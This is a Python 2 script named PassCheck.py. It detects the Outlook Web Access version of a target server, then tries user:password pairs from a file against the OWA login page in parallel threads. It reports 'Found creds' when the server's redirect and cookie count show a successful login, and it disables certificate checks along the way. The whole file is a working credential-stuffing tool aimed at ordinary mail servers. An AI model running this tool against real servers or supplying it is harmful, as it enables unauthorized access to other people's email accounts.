#!/usr/bin/python

import sys,os
import Queue
import urlparse
import threading
import time
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.poolmanager import PoolManager
import ssl

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += 'HIGH:!DH:!aNULL'

paths = {'OWA version 2003': '/exchweb/bin/auth/owaauth.dll',
         'OWA version 2007': '/owa/auth/owaauth.dll',
         'OWA version > 2007': '/owa/auth.owa'}

class Colors:
        BLUE        = '\033[94m'
        GREEN       = '\033[32m'
        RED         = '\033[0;31m'
        DEFAULT     = '\033[0m'
        ORANGE      = '\033[33m'
        WHITE       = '\033[97m'
        BOLD        = '\033[1m'
        BR_COLOUR = '\033[1;37;40m'

class MyAdapter(HTTPAdapter):
    def init_poolmanager(self, connections, maxsize, block=False):
        self.poolmanager = PoolManager(num_pools=connections,
                                       maxsize=maxsize,
                                       block=block,
                                       ssl_version=ssl.PROTOCOL_TLSv1)


def login(user_pwd):
    """
    Check id credentials are valid against the target server
    :return: number of cookies set by server or 0. In case of successfull login, number of cookies will be > 1 !
    """
    user, pwd = user_pwd
    pwd =pwd.strip()
    user =user.strip()

    payload = {'destination': server,
               'flags': 4,
               'forcedownlevel': 0,
               'username': user,
               'password': pwd,
               'passwordText': '',
               'isUtf8': 1}
    s = requests.Session()
    s.mount('https://', MyAdapter())
    r = s.post(server, data=payload, verify=False, allow_redirects=False)
    if r.status_code == 302:
        cookies = r.cookies
        cookie_num = len(cookies)
        if cookie_num >= 4:
		print Colors.GREEN+"[+] Found creds: "+user+":"+pwd+Colors.DEFAULT
        else:
                print '[-] Failed login for: "%s" : "%s"' % (user, pwd)
    else:
        print '\n[!] Wrong status code [%s]. Is the target URL valid?' % r.status_code

def check_url(url):
    s = requests.Session()
    s.mount('https://', MyAdapter())
    r = s.get(url,timeout=15, verify=False)
    return r.status_code


def check_path():
    current_path = urlparse.urlparse(target).path
    if not current_path or current_path == "/":
        srv = target.rstrip('/')   # just in case
        print '[!] Trying to guess OWA version. Please wait...'
        for key, value in paths.items():
            url = srv + value
            if check_url(url) == 200:
                print '[!] Looks like %s' % key
                print '[!] Using "%s" as a target' % url
                return url
    else:
        print '[!] Using "%s" as a target' % target
        return target

def main():
	q = Queue.Queue()
	f = open(filename, 'rb')
	threads = 10

	i = 0

	for line in f:
		user, passw = line.split(":")
		q.put((user, passw))

	while not q.empty():
		tcount = threading.active_count()
                if tcount < threads:
			p = threading.Thread(target=login, args=(q.get(),))
			p.start()
		else:
			time.sleep(0.5)
	tcount = threading.active_count()
        while tcount > 1:
                # Waiting for threads to finish
		time.sleep(1)
                tcount = threading.active_count()
        i += 1


if __name__ == '__main__':
	if len(sys.argv) < 2:
		print "Usage: ./PassCheck.py <URL> <FILE>"
		sys.exit(1)

	target = sys.argv[1]
	filename = sys.argv[2]
	server = check_path()
	main()

